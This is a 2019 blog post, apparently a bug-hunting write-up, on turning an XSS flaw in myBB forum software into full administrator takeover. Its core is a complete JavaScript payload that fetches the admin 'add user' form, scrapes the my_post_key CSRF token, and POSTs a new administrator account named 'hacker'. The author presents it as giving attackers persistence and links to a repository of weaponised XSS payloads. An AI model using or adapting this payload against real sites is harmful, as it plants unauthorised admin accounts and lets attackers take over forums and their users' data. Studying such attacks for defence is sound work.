---
layout: post
title:	"myBB - Add Administrator via XSS"
date:	2019-05-29 03:00:00
categories:
    - notes
tags:
    - bug_hunting
    - bug_writeup
---
<head>
	<title> myBB - Add Administrator via XSS </title>
</head>


# i. Introduction
While browsing Twitter, I happened to come upon [hakluke's](https://twitter.com/hakluke) blog post about upgrading an XSS from a medium to a critical bug. Long story short it detailed on how an XSS is able to bypass most CSRF protection mechanisms, and completely bypassing the Same Origin Policy. The most popular anti-CSRF mechanism are CSRF tokens. However, Javascript is able to request the form, parse the token, and then send it along with the subsequent request to perform a sensitive action. 

If you would like to read more about how this works, I highly recommend reading hakluke's blog post which can be found here: https://medium.com/@hakluke/upgrade-xss-from-medium-to-critical-cb96597b6cc4

hakluke included several proof of concepts for popular CMS platforms such as Wordpress and Drupal. I decided I wanted to give it a shot, and try testing it with a forum software that we all know and love... myBB. 

There are several reasons why I chose myBB, however the major one was that developers are able to create their own plugins similar as to Wordpress. By allowing developers to create third party plugins, it opens the door for a plethora of bugs, which XSS seems to be common. 


# ii. Exploitation

I have modified hakluke's original Wordpress script to work with myBB.

Script:
~~~
/*
mybb - adds administrator with username hacker and password hacker12345
tested on latest version of mybb v1.8.20
original script by hakluke modified by mqt
*/
var mybb_root = "" // don't add a trailing slash
var req = new XMLHttpRequest();
var url = mybb_root + "/admin/index.php?module=user-users&action=add";
var regex = /my_post_key" value="([^"]*?)"/g;
req.open("GET", url, false);
req.send();
var nonce = regex.exec(req.responseText);
var nonce = nonce[1];
var params = "my_post_key="+nonce+"&username=hacker&password=hacker12345&confirm_password=hacker12345&email=hacker@hacker.com&usergroup=4&displaygroup=0"; //make sure passwod is 6+ chars
req.open("POST", url, true);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send(params);
~~~ 

In short, in order to perform any sensitive action in the myBB Admin Panel, there is a token that is required which is called my_post_key. The following script sends a request to the myBB Admin Panel form which is responsible for adding a new user (which seems to have a lifespan of 30 minutes before asking the user to reauthenticate). Then it retrieves the source and parses it looking for my_post_key. Once it finishes, it sends a subsequent request to add a user to the Administrator group with the username as hacker and password as hacker12345.


Here is a video proof of concept demonstrating it in action:

[![mybb XSS - Add Administrator]({{ site.baseurl }}/images/posts/2017/mybb-add-admin/video-preview.png)](https://vimeo.com/339213610 "myBB XSS - Add Administrator")

You can find this script and more powerful scripts on the `weaponised-XSS-payloads` repo which can be found here: https://github.com/hakluke/weaponised-XSS-payloads

# iii. Conclusion

What really made this concept interesting to me was that whenever people hear XSS, the first thing that pops into mind is cookie stealing. While cookie stealing can be very powerful, there are some downsides. One major downside occurs in stored XSS. In stored XSS, it is hard to gauge whenever the payload will execute. In a lot of cases, by the time the payload executes and you receive the cookie, the session is expired by then. However using a script like this, you can ensure that you have some form of persistence.

Once again, all credit goes to [hakluke](https://twitter.com/hakluke) and their wonderful blog post.

As always, thank you for reading.

\- mqt

Sources:
~~~
https://medium.com/@hakluke/upgrade-xss-from-medium-to-critical-cb96597b6cc4
~~~

